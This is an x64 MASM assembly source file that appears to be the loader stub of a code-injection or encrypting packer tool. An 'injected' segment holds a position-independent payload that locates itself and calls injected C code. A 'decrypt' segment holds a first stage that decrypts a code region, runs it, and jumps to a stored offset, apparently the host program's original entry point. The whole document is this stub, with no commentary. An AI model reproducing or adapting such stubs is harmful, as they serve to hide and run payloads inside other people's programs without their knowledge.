public payload
public __begin_of_code
public delta
public to_c_code

injected segment read execute

    __begin_of_code label BYTE 
    payload proc
        pop rsi

        call _next
        _next:
            ; load rip into rbp
            pop rbp 
            ; substract _next offset (from section begin) from rip
            sub rbp, _next - payload

            ; align
            ;;sub rsp, 16
            ;and rsp, -1 

            ; call inj_code_c
            mov rbx, [rbp + (to_c_code - __begin_of_code)]
            add rbx, rbp
            push 0
            call rbx
            push rsi
            ret

        _end:
        to_c_code label QWORD 
            dq 0
        ;delta label SQWORD
        delta label QWORD
            dq 0
    payload endp

injected ends

public first_stage
public __begin_decrypt
public size_code
public decrypt_code
public decrypt_segment_size
public delta_d

decrypt segment read execute
    __begin_decrypt label BYTE

    first_stage proc

        call _nexti

        _nexti:
            pop rbp 
            sub rbp, _nexti - first_stage
            mov rdi, rbp
            ; align
            sub rsp, 16
            and rsp, -1
            ; call decrypt(addr, size)
            mov rbx, [rbp + (decrypt_code - __begin_decrypt)]
            add rbx, rbp
            push 0
            xor rcx, rcx
            mov ecx, size_code
            ;pop rdx
            ;mov rcx, decrypt_segment_size
            ;pop rcx
            call rbx
            ;pop rax
            ;mov rax, second_stage
            push 0
            ;push 0
            ;push 0
            call rax

            pop rax 

            mov rbx, [rdi + (delta_d - __begin_decrypt)]
            add rbx, rdi
            jmp rbx



        _endi:
        size_code label DWORD
            dq 0
        decrypt_code label QWORD
            dq 0
        decrypt_segment_size label QWORD
            dq 0
        delta_d label QWORD
            dq 0
    
    first_stage endp

    
decrypt ends

END
